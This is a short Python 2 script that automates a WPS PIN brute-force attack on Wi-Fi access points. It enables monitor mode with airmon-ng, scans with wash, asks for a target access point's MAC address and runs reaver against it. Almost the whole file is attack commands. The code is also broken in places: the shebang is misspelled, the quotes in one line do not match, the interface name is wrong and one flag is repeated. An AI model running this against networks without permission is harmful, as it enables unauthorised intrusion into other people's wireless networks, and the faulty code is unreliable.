#!/usr/bin/phython
import os
import socket

os.system("clear")
os.system("airmon-ng check kill")
os.system("airmon-ng start wlan0")
os.system("wash -i wlan0mon")
os.system("echo"^C"")

MACinput=raw_input("Enter MAC Address for Accesspoint:")

os.system("reaver -i wlanomon -b" + MACinput + " -b 60 -l 43 -S -vv")
